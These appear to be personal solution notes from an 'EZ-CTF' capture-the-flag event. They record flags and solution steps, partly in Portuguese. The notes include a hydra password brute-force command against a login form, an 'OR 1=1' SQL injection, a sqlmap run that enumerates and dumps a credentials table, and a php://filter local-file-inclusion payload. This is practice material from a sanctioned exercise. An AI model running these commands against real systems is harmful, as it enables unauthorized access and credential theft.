#### Forensics
https://docs.google.com/presentation/d/1Aapvk_kW5af4h_Ci_vLyJTYpIngtXFKB6f__ZA4KMug/edit#slide=id.g888624581b_0_419

EZ-CTF{TH1S_1S_FR33}



---

hydra -l admin -P /usr/share/wordlists/rockyou.txt http://134.209.16.75:30377/login http-post-form "/api/login:username=^USER^&password=^PASS^:Invalid username or password!

Could not successfully run query (SELECT * FROM members WHERE username = '' OR 1=1;--' AND password = '50347a3f14aea923e9f8eac867fd3bb1') from DB: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--' AND password = '50347a3f14aea923e9f8eac867fd3bb1'' at line 1

sqlmap -r req.txt --dbs

```
available databases [6]:
[*] databasename
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli
[*] sys

```

sqlmap -r  req.txt -p name -D sqli --tables --batch

```
Database: sqli
[2 tables]
+---------------+
| members       |
| preserve_user |
+---------------+


```

sqlmap -r  req.txt -p name -D sqli -T members --columns --batch


```

Database: sqli
Table: members
[3 columns]
+----------+----------+
| Column   | Type     |
+----------+----------+
| password | longtext |
| user_id  | int      |
| username | longtext |
+----------+----------+


```

sqlmap -r  req.txt -p name -D sqli -T members -C username --dump-all --batch


```
+---------+------------------------+----------+
| user_id | password               | username |
+---------+------------------------+----------+
| 111     | deh8923uxh2iux22343fw4 | admin    |
+---------+------------------------+----------+

```

```
Database: mysql
[37 tables]
+------------------------------------------------------+
| user                                                 |
| columns_priv                                         |
| component                                            |
| db                                                   |
| default_roles                                        |
| engine_cost                                          |
| func                                                 |
| general_log                                          |
| global_grants                                        |
| gtid_executed                                        |
| help_category                                        |
| help_keyword                                         |
| help_relation                                        |
| help_topic                                           |
| innodb_index_stats                                   |
| innodb_table_stats                                   |
| password_history                                     |
| plugin                                               |
| procs_priv                                           |
| proxies_priv                                         |
| replication_asynchronous_connection_failover         |
| replication_asynchronous_connection_failover_managed |
| replication_group_configuration_version              |
| replication_group_member_actions                     |
| role_edges                                           |
| server_cost                                          |
| servers                                              |
| slave_master_info                                    |
| slave_relay_log_info                                 |
| slave_worker_info                                    |
| slow_log                                             |
| tables_priv                                          |
| time_zone                                            |
| time_zone_leap_second                                |
| time_zone_name                                       |
| time_zone_transition                                 |
| time_zone_transition_type                            |
+------------------------------------------------------+
```

EZ-CTF{N0t_S0_S4f3_4ft3r_411}

---

http://ez.ctf.cafe:9999/robots.txt

User-agent: *
Disallow: /flag.php

http://ez.ctf.cafe:9999/flag.php

How do you filter your coffee?

Desligar CSS para poder ver o parametro file do LFI

http://ez.ctf.cafe:9999/blog-posts.php?file=php://filter/convert.base64-encode/resource=flag.php


PD9waHAKCWVjaG8gJ0hvdyBkbyB5b3UgZmlsdGVyIHlvdXIgY29mZmVlPyc7ICAgIAoJLy8gRVotQ1RGe0xGSV8xU18zWn0KPz4K

EZ-CTF{LFI_1S_3Z}


---
Alien Dream

EZ-CTF{Steven_Boone_Amy_Cordova_Boone_Land_of_Enchantment}
EZ-CTF{steven_Boone_Amy_CordovaBoone_LandOfEnchantment}

---
teclas do telemovel antigo 

```
8/44/444/7777\\\444/7777\\\8/44/33\\\555/2/6/33/7777/8\\\222/8/333\\\333/555/2/4\\\33/888/33/33/33/33/777

```

EZ-CTF{this_is_the_lamest_ctf_flag_eveeeer}
all-caps
EZ-CTF{THIS_IS_THE_LAMEST_CTF_FLAG_EVEEEER}

---

steghide extract -sf Bernie 
passphrase: nao tinha 

cat FlagHere.txt 
```
28x\32x\38x\28x\32x\38x\28x\32x\38x\28x\32x\38xE\28x\32x\38x\28x\32x\38xZ\28x\32x\38x-\28x\32x\38xC\28x\32x\38x\28x\32x\38xT\28x\32x\38xF\28x\32x\38x{N\28x\32x\38xO\28x\32x\38xW\28x\32x\38x_\28x\32x\38x\28x\32x\38xY\28x\32x\38x\28x\32x\38xO\28x\32x\38xU_\28x\32x\38xS\28x\32x\38x\28x\32x\38x\28x\32x\38x\28x\32x\38xE\28x\32x\38x\28x\32x\38xE\28x\32x\38x_\28x\32x\38xM\28x\32x\38xE\28x\32x\38x\28x\32x\38x_\28x\32x\38xN\28x\32x\38xI\28x\32x\38x\28x\32x\38xC\28x\32x\38xE\28x\32x\38x}\28x\32x\38x\28x\32x\38x\28x\32x\38x\28x\32x\38x\28x\32x\38x\28x\32x\38x

```

```
28 32 38 28 32 38 28 32 38 28 32 38 E 28 32 38 28 32 38 Z 28 32 38 - 28 32 38 C 28 32 38 28 32 38 T 28 32 38 F 28 32 38 {N 28 32 38 O 28 32 38 W 28 32 38 _ 28 32 38 28 32 38 Y 28 32 38 28 32 38 O 28 32 38 U_ 28 32 38 S 28 32 38 28 32 38 28 32 38 28  32 38 E 28 32 38 28 32 38 E 28 32 38 _ 28 32 38 M 28 32 38 E 28 32 38 28 32 38 _ 28 32 38 N 28 32 38 I 28 32 38 28 32 38 C 28 32 38 E 28 32 38} 28 32 38 28 32 38 28 32 38 28 32 38 28 32 38 28 32 38

```

```
EZ-CTF{NOW_YOU_SEE_ME_NICE} 28 32 38 28 32 38 28 32 38 28 32 38 28 32 38 28 32 38

```

---

NEO

EZ-CTF{Y0U_T00K_TH3_R3D_P1LL_D1DNT_Y0U}

EZ-CTF{YOU_TOOK_THE_RED_PILL_DIDNT_Y0U}

---


EZ-CTF{LFI_1S_3Z}